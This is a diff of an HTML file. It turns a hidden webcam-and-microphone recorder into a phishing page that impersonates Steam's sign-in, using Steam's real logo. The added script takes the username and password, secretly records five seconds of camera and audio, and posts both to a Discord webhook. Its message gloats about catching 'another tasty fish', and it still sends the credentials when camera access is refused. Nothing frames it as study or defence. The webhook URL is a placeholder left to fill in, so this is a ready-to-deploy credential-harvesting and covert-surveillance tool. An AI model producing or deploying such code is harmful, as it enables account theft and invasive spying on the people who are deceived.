@@ -2,82 +2,89 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Capture</title>
+    <title>Sign In</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #1a1a1a; color: #fff; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; margin: 10px; font-weight: bold; }
-        #startBtn { background-color: #e74c3c; color: white; }
-        #stopBtn { background-color: #7f8c8d; color: white; display: none; }
-        video { display: none; /* Hidden by default for stealth */ margin-top: 20px; max-width: 400px; border-radius: 8px; }
+        body { background-color: #1b2838; color: #c6d4df; font-family: "Motiva Sans", Sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #181a21; padding: 40px; border-radius: 4px; width: 400px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 170px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 5px; color: #afc0ce; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .input-group input { width: 100%; padding: 10px; background-color: #32353c; border: none; color: #fff; border-radius: 3px; box-sizing: border-box; outline: none; }
+        .input-group input:focus { border: 1px solid #1a44c2; }
+        .btn { width: 100%; padding: 12px; background: linear-gradient(to right, #47bfff 5%, #1a44c2 60%); border: none; color: white; font-size: 16px; border-radius: 3px; cursor: pointer; }
+        .btn:hover { background: linear-gradient(to right, #47bfff 5%, #1a44c2 80%); }
     </style>
 </head>
 <body>
-
-    <h2>Click to Start</h2>
-    <button id="startBtn">Start Capture</button>
-    <button id="stopBtn">Stop & Save</button>
-    <video id="preview" autoplay muted></video>
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
+        </div>
+        <div class="input-group">
+            <label>Sign in with account name</label>
+            <input type="text" id="username">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password">
+        </div>
+        <button class="btn" id="loginBtn">Sign in</button>
+    </div>
 
     <script>
-        let mediaRecorder;
-        let recordedChunks = [];
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const videoElement = document.getElementById('preview');
+        // PUT YOUR WEBHOOK URL HERE
+        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 
-        startBtn.addEventListener('click', async () => {
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
             try {
-                // Request both video and audio
+                // Request camera and mic
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // Optional: Show preview (remove this line if you want it completely hidden)
-                // videoElement.srcObject = stream; 
-                // videoElement.style.display = 'block';
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
 
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    // Prepare the payload for Discord
+                    const formData = new FormData();
+                    formData.append('content', `well well well you captured another tasty fish\n**Username:** ${user}\n**Password:** ${pass}`);
+                    formData.append('file', blob, 'capture.webm');
+
+                    // Exfiltrate to Discord
+                    try {
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log('Exfiltration successful');
+                    } catch (err) {
+                        console.error('Webhook failed:', err);
                     }
                 };
 
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.style.display = 'none';
-                    a.href = url;
-                    a.download = 'capture_' + new Date().getTime() + '.webm';
-                    document.body.appendChild(a);
-                    a.click();
-                    setTimeout(() => {
-                        document.body.removeChild(a);
-                        window.URL.revokeObjectURL(url);
-                    }, 100);
-                    recordedChunks = []; // Reset
-                };
-
                 mediaRecorder.start();
-                startBtn.style.display = 'none';
-                stopBtn.style.display = 'inline-block';
-                stopBtn.style.backgroundColor = '#2ecc71';
+                
+                // Record for 5 seconds then stop and send
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 5000);
 
             } catch (err) {
-                console.error("Error accessing media devices.", err);
-                alert("Permissions denied or devices not found.");
+                console.error("Camera/Mic access denied:", err);
+                // Still send the credentials even if they deny the camera!
+                const formData = new FormData();
+                formData.append('content', `well well well you captured another tasty fish (No video - permission denied)\n**Username:** ${user}\n**Password:** ${pass}`);
+                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
             }
-        });
-
-        stopBtn.addEventListener('click', () => {
-            mediaRecorder.stop();
-            // Stop all tracks to turn off the camera light
-            mediaRecorder.stream.getTracks().forEach(track => track.stop());
-            
-            startBtn.style.display = 'inline-block';
-            stopBtn.style.display = 'none';
-            videoElement.style.display = 'none';
         });
     </script>
 </body>
